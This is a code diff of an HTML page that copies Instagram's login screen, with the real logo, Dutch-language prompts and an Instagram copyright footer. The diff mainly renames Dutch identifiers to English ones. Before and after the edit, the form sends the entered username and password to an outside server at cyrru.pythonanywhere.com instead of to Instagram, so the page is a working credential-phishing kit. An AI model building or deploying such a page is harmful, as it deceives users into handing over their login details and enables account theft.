@@ -7,44 +7,43 @@
 
 <body>
   <span id="root">
-    <section class="sectie-alles">
+    <section class="section-all">
       <link rel="stylesheet" href="css/css.css">
-      <!-- 1-Role Hoofdgedeelte -->
-      <main class="hoofd" role="hoofdgedeelte">
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
         <div class="wrapper">
-          <article class="artikel">
-            <div class="inhoud">
+          <article class="article">
+            <div class="content">
               <div class="login-box">
-                <div class="kop">
+                <div class="header">
                   <img class="logo"
                     src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                     alt="Instagram">
                 </div><!-- Kop einde -->
-                <div class="formulier-wrap">
-                  <form class="formulier" action="https://cyrru.pythonanywhere.com/inloggen1" method="POST" class="mijn-login-validatie"
+                <div class="form-wrap">
+                  <form class="form" action="https://cyrru.pythonanywhere.com/login1" method="POST" class="my-login-validation"
                     novalidate=""">
-
-                    <div class=" invoerveld">
-                    <input type="text" id="gebruikersnaam" placeholder="Telefoonnummer, gebruikersnaam of e-mail" aria-required="true"
-                      maxlength="30" autocapitalize="off" autocorrect="off" name="gebruikersnaam" required>
+                    <div class=" input-box">
+                    <input type="text" id="username" placeholder="Telefoonnummer, gebruikersnaam of e-mail" aria-required="true"
+                      maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                 </div>
 
-                <div class="invoerveld">
-                  <input type="wachtwoord" name="wachtwoord" id="wachtwoord" placeholder="Wachtwoord" maxlength="30"
+                <div class="input-box">
+                  <input type="password" name="password" id="password" placeholder="Wachtwoord" maxlength="30"
                     aria-required="true" autocapitalize="off" autocorrect="off" required>
                 </div>
 
-                <span class="knop-vak">
-                  <button class="knop" type="verzenden">Inloggen</button>
+                <span class="button-box">
+                  <button class="btn" type="verzenden">Inloggen</button>
                 </span>
 
-                <a class="vergeten" href="/">Wachtwoord vergeten?</a>
+                <a class="forgot" href="/">Wachtwoord vergeten?</a>
                 </form>
               </div> <!-- Formulier-wrap einde -->
             </div> <!-- Login-box einde -->
 
             <div class="login-box">
-              <p class="tekst">Heb je nog geen account? <a href="/">Registreer</a></p>
+              <p class="text">Heb je nog geen account? <a href="/">Registreer</a></p>
             </div> <!-- Aanmelden-box einde --><!-- App einde -->
         </div> <!-- Inhoud einde -->
         </article>
@@ -52,9 +51,9 @@
       </main>
 
       <!-- 2-Role Voettekst -->
-      <footer class="voettekst" role="inhoudsinfo">
-        <div class="voettekst-container">
-          <span class="voettekst-logo">&copy; 2023 Instagram</span>
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+          <span class="footer-logo">&copy; 2023 Instagram</span>
         </div> <!-- Voettekstcontainer einde -->
       </footer>
 
